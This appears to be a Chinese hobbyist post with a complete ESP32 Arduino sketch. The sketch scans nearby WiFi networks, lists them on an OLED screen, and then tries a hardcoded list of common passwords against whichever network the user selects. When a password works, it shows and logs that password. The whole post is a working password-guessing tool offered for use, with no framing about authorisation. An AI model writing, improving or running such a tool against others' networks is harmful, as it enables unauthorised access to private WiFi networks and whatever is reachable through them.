
esp32自带wifi连接功能，只需要将扫描到的wifi热点显示在屏幕上，然后供选择后，开始密码扫描即可。

 代码：

 ```c
#include <U8g2lib.h>
#include <WiFi.h>
#include <vector>

// === 引脚定义（按你的要求）===
#define OLED_SCL 25
#define OLED_SDA 27
#define BTN_UP     22
#define BTN_DOWN   21
#define BTN_SELECT 17

// === 状态机 ===
enum AppState {
  STATE_BROWSING,
  STATE_CONNECTING,
  STATE_RESULT
};

enum ResultType {
  RESULT_SUCCESS,
  RESULT_FAILURE
};

// === 全局对象 ===
U8G2_SSD1306_128X64_NONAME_F_SW_I2C u8g2(U8G2_R0, OLED_SCL, OLED_SDA, U8X8_PIN_NONE);

// === 全局变量 ===
std::vector<String> scannedSSIDs;
int selectedIndex = 0;
AppState currentState = STATE_BROWSING;
ResultType lastResult = RESULT_FAILURE;

// === 预设密码列表 ===
const char* commonPasswords[] = {
  "12345678", "88888888", "99999999", "11111111"
};
const int passwordCount = sizeof(commonPasswords) / sizeof(commonPasswords[0]);

String targetSSID;
String lastTriedPassword;
int currentPasswordIndex = 0;
unsigned long connectStartTime = 0;
const unsigned long connectTimeout = 8000; // 8秒超时

// === 函数声明 ===
void initHardware();
void scanNetworks();
void displayNetworks();
void displayConnectingStatus();
void displayResult();
void startConnecting();
void handleButtons();

// === 主函数 ===
void setup() {
  Serial.begin(115200);
  Serial.println("=== WiFi 密码尝试器（自定义引脚）===");

  initHardware();
  scanNetworks();
  displayNetworks();
}

void loop() {
  handleButtons();

  if (currentState == STATE_CONNECTING) {
    wl_status_t status = WiFi.status();

    if (status == WL_CONNECTED) {
      lastTriedPassword = commonPasswords[currentPasswordIndex];
      lastResult = RESULT_SUCCESS;
      currentState = STATE_RESULT;
      Serial.println("\n🎉 连接成功！");
      Serial.print("SSID: "); Serial.println(targetSSID);
      Serial.print("Password: "); Serial.println(lastTriedPassword);
      displayResult();
      return;
    }

    if (millis() - connectStartTime > connectTimeout) {
      currentPasswordIndex++;
      if (currentPasswordIndex < passwordCount) {
        WiFi.disconnect();
        WiFi.begin(targetSSID.c_str(), commonPasswords[currentPasswordIndex]);
        connectStartTime = millis();
        lastTriedPassword = commonPasswords[currentPasswordIndex];
        Serial.printf("尝试密码 %d: %s\n", currentPasswordIndex + 1, lastTriedPassword.c_str());
        displayConnectingStatus();
      } else {
        lastResult = RESULT_FAILURE;
        currentState = STATE_RESULT;
        Serial.println("❌ 所有密码尝试失败");
        displayResult();
        return;
      }
    }
    displayConnectingStatus();
  }

  delay(5);
}

// === 初始化硬件 ===
void initHardware() {
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_SELECT, INPUT_PULLUP);

  u8g2.begin();
  u8g2.enableUTF8Print(); // 支持中文
}

// === 扫描 WiFi ===
void scanNetworks() {
  Serial.println("正在扫描 WiFi 热点...");

  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2.drawUTF8(0, 15, "正在扫描...");
  u8g2.sendBuffer();

  int n = WiFi.scanNetworks();
  scannedSSIDs.clear();
  selectedIndex = 0;

  if (n > 0) {
    for (int i = 0; i < n && i < 15; i++) {
      scannedSSIDs.push_back(WiFi.SSID(i));
    }
  } else {
    scannedSSIDs.push_back("无可用网络");
  }
  WiFi.scanDelete();
}

// === 显示网络列表 ===
void displayNetworks() {
  if (currentState != STATE_BROWSING) return;

  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_wqy12_t_gb2312);

  if (scannedSSIDs.empty()) {
    u8g2.drawUTF8(0, 15, "无网络");
    u8g2.sendBuffer();
    return;
  }

  const int maxLines = 5;
  int startIdx = (selectedIndex >= maxLines) ? (selectedIndex - maxLines + 1) : 0;

  for (int i = 0; i < maxLines && (startIdx + i) < (int)scannedSSIDs.size(); i++) {
    int listIdx = startIdx + i;
    int yPos = 15 + i * 12;

    if (listIdx == selectedIndex) {
      u8g2.setDrawColor(1);
      u8g2.drawBox(0, yPos - 10, u8g2.getDisplayWidth(), 12);
      u8g2.setDrawColor(0);
      String line = "> " + scannedSSIDs[listIdx];
      u8g2.drawUTF8(4, yPos, line.c_str());
      u8g2.setDrawColor(1);
    } else {
      u8g2.drawUTF8(12, yPos, scannedSSIDs[listIdx].c_str());
    }
  }
  u8g2.sendBuffer();
}

// === 显示连接状态 ===
void displayConnectingStatus() {
  if (currentState != STATE_CONNECTING) return;

  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2.drawUTF8(0, 10, "正在尝试连接:");
  u8g2.drawUTF8(0, 25, targetSSID.c_str());

  if (currentPasswordIndex < passwordCount) {
    String msg = "密码: ";
    msg += commonPasswords[currentPasswordIndex];
    u8g2.drawUTF8(0, 40, msg.c_str());

    String progress = "第 ";
    progress += String(currentPasswordIndex + 1);
    progress += "/";
    progress += String(passwordCount);
    u8g2.drawUTF8(0, 55, progress.c_str());
  }
  u8g2.sendBuffer();
}

// === 显示结果（成功/失败）===
void displayResult() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_wqy12_t_gb2312);

  if (lastResult == RESULT_SUCCESS) {
    u8g2.drawUTF8(0, 10, "连接成功!");
    u8g2.drawUTF8(0, 25, targetSSID.c_str());
    u8g2.drawUTF8(0, 40, "密码:");
    u8g2.drawUTF8(0, 55, lastTriedPassword.c_str());
  } else {
    u8g2.drawUTF8(0, 15, "密码尝试失败");
    u8g2.drawUTF8(0, 30, "按任意键返回");
  }
  u8g2.sendBuffer();
}

// === 开始连接尝试 ===
void startConnecting() {
  if (scannedSSIDs.empty() || scannedSSIDs[selectedIndex] == "无可用网络") return;

  targetSSID = scannedSSIDs[selectedIndex];
  currentPasswordIndex = 0;
  currentState = STATE_CONNECTING;

  Serial.println("\n--- 开始尝试连接 ---");
  Serial.println("SSID: " + targetSSID);

  WiFi.disconnect();
  WiFi.begin(targetSSID.c_str(), commonPasswords[0]);
  connectStartTime = millis();
  lastTriedPassword = commonPasswords[0];
  Serial.println("尝试密码 1: " + lastTriedPassword);
  displayConnectingStatus();
}

// === 按钮处理（核心逻辑）===
void handleButtons() {
  static bool upPressed = false, downPressed = false, selectPressed = false;

  bool upNow = (digitalRead(BTN_UP) == LOW);
  bool downNow = (digitalRead(BTN_DOWN) == LOW);
  bool selectNow = (digitalRead(BTN_SELECT) == LOW);

  // === STATE_RESULT: 任意按钮按下 → 返回列表 ===
  if (currentState == STATE_RESULT) {
    if ((upNow && !upPressed) || (downNow && !downPressed) || (selectNow && !selectPressed)) {
      if (millis() - connectStartTime > 50) { // 简单消抖
        currentState = STATE_BROWSING;
        WiFi.disconnect();
        displayNetworks();
      }
      upPressed = downPressed = selectPressed = true;
      return;
    }
    upPressed = upNow;
    downPressed = downNow;
    selectPressed = selectNow;
    return;
  }

  // === STATE_CONNECTING: UP/DOWN 中断 ===
  if (currentState == STATE_CONNECTING) {
    if ((upNow && !upPressed) || (downNow && !downPressed)) {
      Serial.println("\n⚠️ 用户中断连接尝试");
      currentState = STATE_BROWSING;
      WiFi.disconnect();
      displayNetworks();
      return;
    }
  }

  // === STATE_BROWSING: 正常导航 ===
  if (currentState == STATE_BROWSING) {
    if (upNow && !upPressed) {
      if (selectedIndex > 0) {
        selectedIndex--;
        displayNetworks();
        Serial.printf("↑ 选中: %s\n", scannedSSIDs[selectedIndex].c_str());
      }
      upPressed = true;
    } else if (!upNow) {
      upPressed = false;
    }

    if (downNow && !downPressed) {
      if (selectedIndex < (int)scannedSSIDs.size() - 1) {
        selectedIndex++;
        displayNetworks();
        Serial.printf("↓ 选中: %s\n", scannedSSIDs[selectedIndex].c_str());
      }
      downPressed = true;
    } else if (!downNow) {
      downPressed = false;
    }

    if (selectNow && !selectPressed) {
      startConnecting();
      selectPressed = true;
    } else if (!selectNow) {
      selectPressed = false;
    }
  }
}
```
